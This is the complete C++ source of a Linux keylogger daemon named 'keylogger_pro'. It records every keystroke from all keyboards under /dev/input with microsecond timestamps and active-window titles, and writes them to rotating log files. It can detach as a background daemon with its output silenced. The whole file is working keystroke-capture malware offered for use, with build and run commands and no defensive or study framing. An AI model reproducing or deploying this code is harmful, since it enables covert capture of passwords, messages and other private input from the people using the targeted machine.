/*
 * keylogger_pro.cpp — Production-grade Linux keystroke capture daemon
 *
 * Features:
 *   - Multi-device support (all keyboards captured simultaneously)
 *   - Daemon mode with PID file
 *   - Size-based log rotation with configurable backup count
 *   - Syslog integration
 *   - Per-keystroke timestamps (microsecond resolution)
 *   - Active window context via xdotool (graceful fallback)
 *   - Shift + CapsLock state tracking
 *   - Clean SIGTERM/SIGINT shutdown with flush guarantee
 *   - No root required (input group membership sufficient)
 *
 * Build:  g++ -O2 -std=c++17 -pthread -o keylogger_pro keylogger_pro.cpp
 * Run:    ./keylogger_pro -o /var/log/keys.log
 *         ./keylogger_pro --daemon -o /var/log/keys.log --max-size 20
 */

#include <algorithm>
#include <atomic>
#include <cerrno>
#include <chrono>
#include <cstring>
#include <fcntl.h>
#include <filesystem>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <linux/input.h>
#include <map>
#include <mutex>
#include <optional>
#include <signal.h>
#include <sstream>
#include <string>
#include <sys/stat.h>
#include <syslog.h>
#include <thread>
#include <unistd.h>
#include <vector>

namespace fs = std::filesystem;


// ── Signal ────────────────────────────────────────────────────────────────────

static std::atomic<bool> g_running{true};
static void on_signal(int) { g_running = false; }


// ── Key map ───────────────────────────────────────────────────────────────────

struct KeySym { const char* normal; const char* shifted; };

static const std::map<int, KeySym> KEY_MAP = {
    {KEY_A,{"a","A"}},{KEY_B,{"b","B"}},{KEY_C,{"c","C"}},{KEY_D,{"d","D"}},
    {KEY_E,{"e","E"}},{KEY_F,{"f","F"}},{KEY_G,{"g","G"}},{KEY_H,{"h","H"}},
    {KEY_I,{"i","I"}},{KEY_J,{"j","J"}},{KEY_K,{"k","K"}},{KEY_L,{"l","L"}},
    {KEY_M,{"m","M"}},{KEY_N,{"n","N"}},{KEY_O,{"o","O"}},{KEY_P,{"p","P"}},
    {KEY_Q,{"q","Q"}},{KEY_R,{"r","R"}},{KEY_S,{"s","S"}},{KEY_T,{"t","T"}},
    {KEY_U,{"u","U"}},{KEY_V,{"v","V"}},{KEY_W,{"w","W"}},{KEY_X,{"x","X"}},
    {KEY_Y,{"y","Y"}},{KEY_Z,{"z","Z"}},
    {KEY_1,{"1","!"}},{KEY_2,{"2","@"}},{KEY_3,{"3","#"}},{KEY_4,{"4","$"}},
    {KEY_5,{"5","%"}},{KEY_6,{"6","^"}},{KEY_7,{"7","&"}},{KEY_8,{"8","*"}},
    {KEY_9,{"9","("}},{KEY_0,{"0",")"}},
    {KEY_SPACE,     {" "," "}},
    {KEY_ENTER,     {"[ENTER]\n","[ENTER]\n"}},
    {KEY_TAB,       {"[TAB]","[TAB]"}},
    {KEY_BACKSPACE, {"[BS]","[BS]"}},
    {KEY_ESC,       {"[ESC]","[ESC]"}},
    {KEY_DELETE,    {"[DEL]","[DEL]"}},
    {KEY_HOME,      {"[HOME]","[HOME]"}},
    {KEY_END,       {"[END]","[END]"}},
    {KEY_UP,        {"[UP]","[UP]"}},
    {KEY_DOWN,      {"[DOWN]","[DOWN]"}},
    {KEY_LEFT,      {"[LEFT]","[LEFT]"}},
    {KEY_RIGHT,     {"[RIGHT]","[RIGHT]"}},
    {KEY_PAGEUP,    {"[PGUP]","[PGUP]"}},
    {KEY_PAGEDOWN,  {"[PGDN]","[PGDN]"}},
    {KEY_INSERT,    {"[INS]","[INS]"}},
    {KEY_GRAVE,     {"`","~"}},
    {KEY_MINUS,     {"-","_"}},
    {KEY_EQUAL,     {"=","+"}},
    {KEY_LEFTBRACE, {"[","{"}},
    {KEY_RIGHTBRACE,{"]","}"}},
    {KEY_BACKSLASH, {"\\","|"}},
    {KEY_SEMICOLON, {";",":"}},
    {KEY_APOSTROPHE,{"'","\""}},
    {KEY_COMMA,     {",","<"}},
    {KEY_DOT,       {".",">"}},
    {KEY_SLASH,     {"/","?"}},
    {KEY_CAPSLOCK,  {"[CAPS]","[CAPS]"}},
    {KEY_LEFTSHIFT, {"",""}},
    {KEY_RIGHTSHIFT,{"",""}},
    {KEY_LEFTCTRL,  {"[LCTRL]","[LCTRL]"}},
    {KEY_RIGHTCTRL, {"[RCTRL]","[RCTRL]"}},
    {KEY_LEFTALT,   {"[LALT]","[LALT]"}},
    {KEY_RIGHTALT,  {"[RALT]","[RALT]"}},
    {KEY_LEFTMETA,  {"[META]","[META]"}},
    {KEY_F1, {"[F1]","[F1]"}},{KEY_F2, {"[F2]","[F2]"}},
    {KEY_F3, {"[F3]","[F3]"}},{KEY_F4, {"[F4]","[F4]"}},
    {KEY_F5, {"[F5]","[F5]"}},{KEY_F6, {"[F6]","[F6]"}},
    {KEY_F7, {"[F7]","[F7]"}},{KEY_F8, {"[F8]","[F8]"}},
    {KEY_F9, {"[F9]","[F9]"}},{KEY_F10,{"[F10]","[F10]"}},
    {KEY_F11,{"[F11]","[F11]"}},{KEY_F12,{"[F12]","[F12]"}},
};


// ── Rotating log ──────────────────────────────────────────────────────────────

class RotatingLog {
public:
    RotatingLog(const std::string& path, size_t max_bytes, int backups)
        : path_(path), max_bytes_(max_bytes), backups_(backups)
    {
        open_file();
    }

    ~RotatingLog() { flush(); }

    void write(const std::string& s) {
        std::lock_guard<std::mutex> lk(mu_);
        buf_ += s;
        bytes_ += s.size();
        if (bytes_ >= max_bytes_) rotate_locked();
    }

    void flush() {
        std::lock_guard<std::mutex> lk(mu_);
        if (!buf_.empty() && f_.is_open()) {
            f_ << buf_;
            f_.flush();
            buf_.clear();
        }
    }

private:
    void open_file() {
        f_.open(path_, std::ios::app);
        if (!f_.is_open())
            throw std::runtime_error("Cannot open log: " + path_);
        struct stat st{};
        if (stat(path_.c_str(), &st) == 0)
            bytes_ = static_cast<size_t>(st.st_size);
    }

    void rotate_locked() {
        f_ << buf_; f_.flush(); buf_.clear(); f_.close();
        for (int i = backups_ - 1; i >= 1; --i) {
            auto src = path_ + "." + std::to_string(i);
            auto dst = path_ + "." + std::to_string(i + 1);
            if (fs::exists(src)) fs::rename(src, dst);
        }
        if (fs::exists(path_)) fs::rename(path_, path_ + ".1");
        bytes_ = 0;
        open_file();
    }

    std::string   path_;
    size_t        max_bytes_;
    int           backups_;
    std::ofstream f_;
    std::string   buf_;
    size_t        bytes_ = 0;
    std::mutex    mu_;
};


// ── Helpers ───────────────────────────────────────────────────────────────────

static std::string timestamp_us() {
    auto now = std::chrono::system_clock::now();
    auto tt  = std::chrono::system_clock::to_time_t(now);
    auto us  = std::chrono::duration_cast<std::chrono::microseconds>(
                   now.time_since_epoch()) % 1'000'000;
    std::tm* tm = std::localtime(&tt);
    std::ostringstream ss;
    ss << std::put_time(tm, "%Y-%m-%d %H:%M:%S")
       << '.' << std::setfill('0') << std::setw(6) << us.count();
    return ss.str();
}

static std::string active_window() {
    FILE* fp = popen("xdotool getactivewindow getwindowname 2>/dev/null", "r");
    if (!fp) return "";
    char buf[256]{};
    fgets(buf, sizeof(buf), fp);
    pclose(fp);
    std::string s(buf);
    while (!s.empty() && (s.back()=='\n'||s.back()=='\r')) s.pop_back();
    return s;
}


// ── Device discovery ──────────────────────────────────────────────────────────

struct KBDevice { std::string path; std::string name; };

static std::vector<KBDevice> find_keyboards() {
    std::vector<KBDevice> result;
    for (int i = 0; i < 64; ++i) {
        std::string p = "/dev/input/event" + std::to_string(i);
        int fd = open(p.c_str(), O_RDONLY | O_NONBLOCK);
        if (fd < 0) continue;

        unsigned long evbits = 0;
        ioctl(fd, EVIOCGBIT(0, sizeof(evbits)), &evbits);
        if (evbits & (1 << EV_KEY)) {
            unsigned long keybits[(KEY_MAX/8)+1]{};
            ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybits)), keybits);
            if (keybits[KEY_A/8] & (1 << (KEY_A%8))) {
                char name[256] = "Unknown";
                ioctl(fd, EVIOCGNAME(sizeof(name)), name);
                result.push_back({p, std::string(name)});
            }
        }
        close(fd);
    }
    return result;
}


// ── Per-device capture thread ─────────────────────────────────────────────────

struct CaptureState {
    bool shift    = false;
    bool caps     = false;
    std::string last_window;
};

static void capture_device(const KBDevice& dev,
                            RotatingLog& log,
                            bool log_device,
                            bool log_window,
                            int flush_ms)
{
    int fd = open(dev.path.c_str(), O_RDONLY);
    if (fd < 0) {
        syslog(LOG_ERR, "Cannot open %s: %s", dev.path.c_str(), strerror(errno));
        return;
    }

    CaptureState st;
    auto last_flush = std::chrono::steady_clock::now();
    std::string line_buf;

    input_event ev{};
    while (g_running) {
        // Non-blocking read with short sleep to avoid busy-wait
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n < 0) {
            if (errno == EAGAIN) {
                // Flush on interval
                auto now = std::chrono::steady_clock::now();
                auto ms  = std::chrono::duration_cast<std::chrono::milliseconds>(
                               now - last_flush).count();
                if (ms >= flush_ms && !line_buf.empty()) {
                    log.write(line_buf);
                    log.flush();
                    line_buf.clear();
                    last_flush = now;
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(5));
                continue;
            }
            break;
        }
        if (n != sizeof(ev)) continue;
        if (ev.type != EV_KEY)  continue;

        // Track shift state
        if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
            st.shift = (ev.value != 0);
            continue;
        }
        // Track caps lock on key press
        if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
            st.caps = !st.caps;
            continue;
        }
        // Only process key presses and repeats
        if (ev.value == 0) continue;

        auto it = KEY_MAP.find(ev.code);
        if (it == KEY_MAP.end()) continue;

        bool upper  = st.shift ^ st.caps;
        std::string sym = upper ? it->second.shifted : it->second.normal;
        if (sym.empty()) continue;

        // Window context change — emit header line
        if (log_window) {
            std::string win = active_window();
            if (win != st.last_window && !win.empty()) {
                st.last_window = win;
                std::string hdr = "\n[" + timestamp_us() + "] [Window: " + win + "]\n";
                line_buf += hdr;
            }
        }

        // Emit timestamped keystroke
        std::string entry = "[" + timestamp_us() + "]";
        if (log_device) entry += " [" + dev.name + "]";
        entry += " " + sym;
        if (sym.back() != '\n') entry += "\n";

        line_buf += entry;
    }

    // Final flush on shutdown
    if (!line_buf.empty()) {
        log.write(line_buf);
        log.flush();
    }

    close(fd);
}


// ── Daemon mode ───────────────────────────────────────────────────────────────

static void daemonize(const std::string& pid_file) {
    pid_t pid = fork();
    if (pid < 0) { perror("fork"); exit(1); }
    if (pid > 0) exit(0);  // parent exits

    if (setsid() < 0) { perror("setsid"); exit(1); }

    // Second fork to prevent TTY re-acquisition
    pid = fork();
    if (pid < 0) { perror("fork"); exit(1); }
    if (pid > 0) exit(0);

    umask(0);
    chdir("/");

    // Redirect stdio to /dev/null
    int null_fd = open("/dev/null", O_RDWR);
    dup2(null_fd, STDIN_FILENO);
    dup2(null_fd, STDOUT_FILENO);
    dup2(null_fd, STDERR_FILENO);
    close(null_fd);

    // Write PID file
    if (!pid_file.empty()) {
        std::ofstream pf(pid_file);
        if (pf.is_open()) pf << getpid() << "\n";
    }

    openlog("keylogger_pro", LOG_PID, LOG_DAEMON);
    syslog(LOG_INFO, "Daemon started (pid %d)", getpid());
}


// ── CLI ───────────────────────────────────────────────────────────────────────

static void usage(const char* prog) {
    std::cerr
        << "Usage: " << prog << " [OPTIONS]\n\n"
        << "Options:\n"
        << "  -o, --output <file>     Log output path (required)\n"
        << "  -d, --daemon            Run as background daemon\n"
        << "  -p, --pid-file <file>   PID file path (daemon mode)\n"
        << "      --max-size <MB>     Log rotation size in MB (default: 10)\n"
        << "      --backups <N>       Number of rotated backups (default: 5)\n"
        << "      --flush <ms>        Flush interval in ms (default: 250)\n"
        << "      --no-device         Omit device name from log entries\n"
        << "      --no-window         Omit active window context\n"
        << "  -l, --list              List detected keyboards and exit\n"
        << "  -h, --help              Show this help\n\n"
        << "Examples:\n"
        << "  sudo " << prog << " -o /var/log/keys.log\n"
        << "  sudo " << prog << " --daemon -o /var/log/keys.log --max-size 20\n";
}


int main(int argc, char* argv[]) {
    signal(SIGINT,  on_signal);
    signal(SIGTERM, on_signal);

    std::string output;
    std::string pid_file  = "/tmp/keylogger.pid";
    size_t      max_mb    = 10;
    int         backups   = 5;
    int         flush_ms  = 250;
    bool        daemon_m  = false;
    bool        log_dev   = true;
    bool        log_win   = true;
    bool        list_only = false;

    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        auto next = [&]() -> std::string {
            if (i + 1 >= argc) { std::cerr << a << " needs an argument\n"; exit(1); }
            return argv[++i];
        };
        if      (a=="-o"||a=="--output")   output   = next();
        else if (a=="-p"||a=="--pid-file") pid_file = next();
        else if (a=="--max-size")          max_mb   = std::stoul(next());
        else if (a=="--backups")           backups  = std::stoi(next());
        else if (a=="--flush")             flush_ms = std::stoi(next());
        else if (a=="-d"||a=="--daemon")   daemon_m = true;
        else if (a=="--no-device")         log_dev  = false;
        else if (a=="--no-window")         log_win  = false;
        else if (a=="-l"||a=="--list")     list_only= true;
        else if (a=="-h"||a=="--help") { usage(argv[0]); return 0; }
        else { std::cerr << "Unknown option: " << a << "\n"; usage(argv[0]); return 1; }
    }

    auto keyboards = find_keyboards();

    if (list_only) {
        if (keyboards.empty()) { std::cerr << "No keyboards found.\n"; return 1; }
        for (auto& kb : keyboards)
            std::cout << kb.path << "  —  " << kb.name << "\n";
        return 0;
    }

    if (output.empty()) {
        std::cerr << "[!] No output file specified. Use -o <path>.\n";
        usage(argv[0]); return 1;
    }
    if (keyboards.empty()) {
        std::cerr << "[!] No keyboard devices found.\n"; return 1;
    }

    if (daemon_m) daemonize(pid_file);

    RotatingLog log(output, max_mb * 1024 * 1024, backups);

    // Write session header
    {
        std::string hdr = "\n[SESSION START  " + timestamp_us() + "]\n";
        hdr += "[Devices]\n";
        for (auto& kb : keyboards)
            hdr += "  " + kb.path + "  " + kb.name + "\n";
        log.write(hdr);
        log.flush();
    }

    if (!daemon_m) {
        std::cerr << "[*] Capturing on " << keyboards.size() << " device(s)\n";
        std::cerr << "[*] Output: " << output << "\n";
        std::cerr << "[*] Ctrl-C to stop\n\n";
    }

    // One thread per keyboard device
    std::vector<std::thread> threads;
    threads.reserve(keyboards.size());
    for (auto& kb : keyboards)
        threads.emplace_back(capture_device,
                             std::cref(kb),
                             std::ref(log),
                             log_dev, log_win, flush_ms);

    for (auto& t : threads) t.join();

    // Session footer
    log.write("\n[SESSION END    " + timestamp_us() + "]\n");
    log.flush();

    if (daemon_m) {
        syslog(LOG_INFO, "Daemon stopped");
        closelog();
        if (!pid_file.empty()) fs::remove(pid_file);
    } else {
        std::cerr << "\n[*] Stopped.\n";
    }

    return 0;
}